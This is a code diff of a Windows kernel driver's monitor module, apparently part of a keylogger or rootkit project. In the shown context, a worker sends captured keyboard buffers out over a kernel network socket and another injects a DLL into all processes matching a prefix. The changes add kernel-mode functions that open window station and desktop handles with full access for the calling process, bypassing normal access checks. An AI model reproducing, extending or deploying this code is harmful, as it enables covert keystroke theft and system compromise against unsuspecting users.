@@ -1,12 +1,13 @@
 #include <inc/klogger.h>
 #include <inc/monitor.h>
-
+#include <h/drvioctl.h>
+#include <inc/ntapiex.h>
 
 #define __SUBCOMPONENT__ "ecore"
 
 static MONITOR g_Monitor;
 
-VOID MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
+NTSTATUS MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
 {
 	NTSTATUS Status;
 	SOCKADDR_IN LocalAddress;
@@ -58,6 +59,8 @@ cleanup:
 
     if (Socket != NULL)
         MWskSocketRelease(Socket);
+
+	return Status;
 }
 
 VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
@@ -65,7 +68,7 @@ VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
 	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
 }
 
-VOID MonitorInjectDllWorker(PVOID Context)
+NTSTATUS MonitorInjectDllWorker(PVOID Context)
 {
 	PMONITOR Monitor = MonitorGetInstance();
 
@@ -73,7 +76,7 @@ VOID MonitorInjectDllWorker(PVOID Context)
 	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
 	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
 	
-	InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
+	return InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
 }
 
 PMONITOR
@@ -88,7 +91,7 @@ VOID
 	KeInitializeGuardedMutex(&Monitor->Mutex);
 	SysWorkerInit(&Monitor->InjectWorker);
 	SysWorkerInit(&Monitor->NetWorker);
-
+	SysWorkerInit(&Monitor->RequestWorker);
 	Monitor->State = MONITOR_STATE_STOPPED;
 }
 
@@ -122,6 +125,13 @@ NTSTATUS
 		goto start_failed;
 	}
 
+	Status = SysWorkerStart(&Monitor->RequestWorker);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "SysWorkerStart failed err=%x", Status);
+		goto start_failed;
+	}
+
+
 	SysWorkerAddWork(&Monitor->InjectWorker, MonitorInjectDllWorker, NULL);
 	Monitor->State = MONITOR_STATE_STARTED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
@@ -129,8 +139,10 @@ NTSTATUS
 	return STATUS_SUCCESS;
 
 start_failed:
+	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->InjectWorker);
 	SysWorkerStop(&Monitor->NetWorker);
+	
 	if (Monitor->WskContext != NULL) {
 		MWskRelease(Monitor->WskContext);
 		Monitor->WskContext = NULL;
@@ -153,6 +165,7 @@ NTSTATUS
 		return STATUS_TOO_LATE;
 	}
 
+	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->NetWorker);
 	SysWorkerStop(&Monitor->InjectWorker);
 
@@ -187,4 +200,182 @@ VOID
 	MonitorInit()
 {
 	MonitorInitInternal(&g_Monitor);
+}
+
+
+NTSTATUS MonitorOpenWinstaWorker(POPEN_WINSTA OpenWinsta)
+{
+	WCHAR FullObjName[0x100];
+	NTSTATUS Status;
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	UNICODE_STRING usFullObjName;
+	BOOLEAN bProcAcquired = FALSE;
+	KAPC_STATE ApcState;
+
+	Status = RtlStringCchPrintfW(FullObjName, sizeof(FullObjName), L"\\sessions\\%d\\windows\\windowstations\\%ws", PsGetProcessSessionId(OpenWinsta->Process), OpenWinsta->WinstaName);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "RtlStringCchPrintfW failed err=%x", Status);
+		goto cleanup;
+	}
+
+	RtlInitUnicodeString(&usFullObjName, FullObjName);
+
+	InitializeObjectAttributes(&ObjectAttributes,
+		&usFullObjName,
+		OBJ_CASE_INSENSITIVE,
+		NULL,
+		NULL
+		);
+
+	Status = PsAcquireProcessExitSynchronization(OpenWinsta->Process);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "Cant acquire process=%p, error=%x", OpenWinsta->Process, Status);
+		goto cleanup;
+	}
+	bProcAcquired = TRUE;
+
+	KeEnterGuardedRegion();
+	KeStackAttachProcess(OpenWinsta->Process, &ApcState);
+	
+	Status = ObOpenObjectByName(
+		&ObjectAttributes,
+		*ExWindowStationObjectType,
+		KernelMode,
+		NULL,
+		GENERIC_ALL,
+		NULL,
+		&OpenWinsta->hWinsta);
+	
+	KeUnstackDetachProcess(&ApcState);
+	KeLeaveGuardedRegion();
+
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usFullObjName, Status);
+		goto cleanup;
+	}
+
+	Status = STATUS_SUCCESS;
+	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usFullObjName, OpenWinsta->hWinsta, OpenWinsta->Process);
+
+cleanup:
+	if (bProcAcquired)
+		PsReleaseProcessExitSynchronization(OpenWinsta->Process);
+	
+	OpenWinsta->Error = RtlNtStatusToDosError(Status);
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS MonitorOpenDesktopWorker(POPEN_DESKTOP OpenDesktop)
+{
+	NTSTATUS Status;
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	UNICODE_STRING usObjName;
+	BOOLEAN bProcAcquired = FALSE;
+	KAPC_STATE ApcState;
+
+	RtlInitUnicodeString(&usObjName, OpenDesktop->DesktopName);
+
+	InitializeObjectAttributes(&ObjectAttributes,
+		&usObjName,
+		OBJ_CASE_INSENSITIVE,
+		OpenDesktop->hWinsta,
+		NULL
+		);
+
+	Status = PsAcquireProcessExitSynchronization(OpenDesktop->Process);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "Cant acquire process=%p, error=%x", OpenDesktop->Process, Status);
+		goto cleanup;
+	}
+	bProcAcquired = TRUE;
+
+	KeEnterGuardedRegion();
+	KeStackAttachProcess(OpenDesktop->Process, &ApcState);
+
+	Status = ObOpenObjectByName(
+		&ObjectAttributes,
+		*ExDesktopObjectType,
+		KernelMode,
+		NULL,
+		GENERIC_ALL,
+		NULL,
+		&OpenDesktop->hDesktop);
+
+	KeUnstackDetachProcess(&ApcState);
+	KeLeaveGuardedRegion();
+
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usObjName, Status);
+		goto cleanup;
+	}
+
+	Status = STATUS_SUCCESS;
+	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usObjName, OpenDesktop->hDesktop, OpenDesktop->Process);
+
+cleanup:
+	if (bProcAcquired)
+		PsReleaseProcessExitSynchronization(OpenDesktop->Process);
+
+	OpenDesktop->Error = RtlNtStatusToDosError(Status);
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS
+MonitorOpenDesktop(POPEN_DESKTOP openDesktop)
+{
+	PSYS_WRK_ITEM WrkItem = NULL;
+	NTSTATUS Status;
+
+	openDesktop->hDesktop = NULL;
+	openDesktop->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);
+
+	openDesktop->Process = PsGetCurrentProcess();
+	ObReferenceObject(openDesktop->Process);
+
+	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenDesktopWorker, openDesktop);
+	if (WrkItem == NULL) {
+		KLog(LError, "Cant queue wrk item");
+		Status = STATUS_UNSUCCESSFUL;
+		goto cleanup;
+	}
+
+	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+	Status = STATUS_SUCCESS;
+
+cleanup:
+	ObDereferenceObject(openDesktop->Process);
+	openDesktop->Process = NULL;
+
+	return Status;
+}
+
+NTSTATUS
+	MonitorOpenWinsta(POPEN_WINSTA openWinsta)
+{
+	PSYS_WRK_ITEM WrkItem = NULL;
+	NTSTATUS Status;
+
+	openWinsta->hWinsta = NULL;
+	openWinsta->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);
+
+	openWinsta->Process = PsGetCurrentProcess();
+	ObReferenceObject(openWinsta->Process);
+
+	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, openWinsta);
+	if (WrkItem == NULL) {
+		KLog(LError, "Cant queue wrk item");
+		Status = STATUS_UNSUCCESSFUL;
+		goto cleanup;
+	}
+
+	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+	Status = STATUS_SUCCESS;
+
+cleanup:
+	ObDereferenceObject(openWinsta->Process);
+	openWinsta->Process = NULL;
+
+	return Status;
 }
